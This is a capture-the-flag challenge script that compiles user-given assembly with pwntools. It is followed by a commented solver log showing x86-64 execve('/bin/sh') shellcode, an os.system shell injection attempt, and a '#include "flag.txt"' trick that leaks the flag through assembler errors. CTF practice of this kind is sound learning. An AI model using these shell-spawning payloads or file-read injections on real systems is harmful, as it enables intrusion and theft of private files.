#!/usr/local/bin/python3
import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import asm

try:
    shellcode = asm(input('> '), arch='amd64', os='linux')
except Exception as e:
    print('Could not compile shellcode. Exiting...')
    exit()

print('Compiled shellcode to X86!')
print(shellcode.hex(' '))




# yunung@DESKTOP-SH18A4C:/mnt/f/pyjail$ nc challs2.pyjail.club 18995
# xor rdi, rdi; mov rbx, 0x68732f6e69622f; shr rbx, 0x8; push rbx; mov rdi, rsp; xor rsi, rsi; xor rdx, rdx; mov rax, 0x3b; syscall
# >
# Compiled shellcode to X86!
# 48 31 ff 48 bb 2f 62 69 6e 2f 73 68 00 48 c1 eb 08 53 48 89 e7 48 31 f6 48 31 d2 48 c7 c0 3b 00 00 00 0f 05
# cat flag.txt
# yunung@DESKTOP-SH18A4C:/mnt/f/pyjail$ nc challs2.pyjail.club 18995
# > xor rdi, rdi; mov rbx, 0x68732f6e69622f; shr rbx, 0x8; push rbx; mov rdi, rsp; xor rsi, rsi; xor rdx, rdx; mov rax, 0x3b; syscall
# Compiled shellcode to X86!
# 48 31 ff 48 bb 2f 62 69 6e 2f 73 68 00 48 c1 eb 08 53 48 89 e7 48 31 f6 48 31 d2 48 c7 c0 3b 00 00 00 0f 05
# ls -la
# yunung@DESKTOP-SH18A4C:/mnt/f/pyjail$  nc challs2.pyjail.club 18995
# > #!python import os; os.system('/bin/sh')
# [ERROR] There was an error running ['cpp', '-C', '-nostdinc', '-undef', '-P', '-I/usr/local/lib/python3.13/site-packages/pwnlib/data/includes']:
#     It had the exitcode 1.
#     It had this on stdout:
#     <stdin>:2:2: error: invalid preprocessing directive #!

# Could not compile shellcode. Exiting...
# nc challs2.pyjail.club 18995
# > #include "flag.txt"
# [ERROR] There was an error running ['/usr/bin/x86_64-linux-gnu-as', '-64', '-o', '/tmp/pwn-asm-iittcc15/step2', '/tmp/pwn-asm-iittcc15/step1']:
#     It had the exitcode 1.
#     It had this on stdout:
#     /tmp/pwn-asm-iittcc15/step1: Assembler messages:
#     /tmp/pwn-asm-iittcc15/step1:8: Error: invalid character '{' in mnemonic

# [ERROR] An error occurred while assembling:
#        1: .section .shellcode,"awx"
#        2: .global _start
#        3: .global __start
#        4: _start:
#        5: __start:
#        6: .intel_syntax noprefix
#        7: .p2align 0
#        8: jail{yeah_just_include_flag.txt_lol}
#     Traceback (most recent call last):
#       File "/usr/local/lib/python3.13/site-packages/pwnlib/asm.py", line 783, in asm
#         _run(assembler + ['-o', step2, step1])
#         ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#       File "/usr/local/lib/python3.13/site-packages/pwnlib/asm.py", line 434, in _run
#         log.error(msg, *args)
#         ~~~~~~~~~^^^^^^^^^^^^
#       File "/usr/local/lib/python3.13/site-packages/pwnlib/log.py", line 439, in error
#         raise PwnlibException(message % args)
#     pwnlib.exception.PwnlibException: There was an error running ['/usr/bin/x86_64-linux-gnu-as', '-64', '-o', '/tmp/pwn-asm-iittcc15/step2', '/tmp/pwn-asm-iittcc15/step1']:
#     It had the exitcode 1.
#     It had this on stdout:
#     /tmp/pwn-asm-iittcc15/step1: Assembler messages:
#     /tmp/pwn-asm-iittcc15/step1:8: Error: invalid character '{' in mnemonic

# Could not compile shellcode. Exiting...
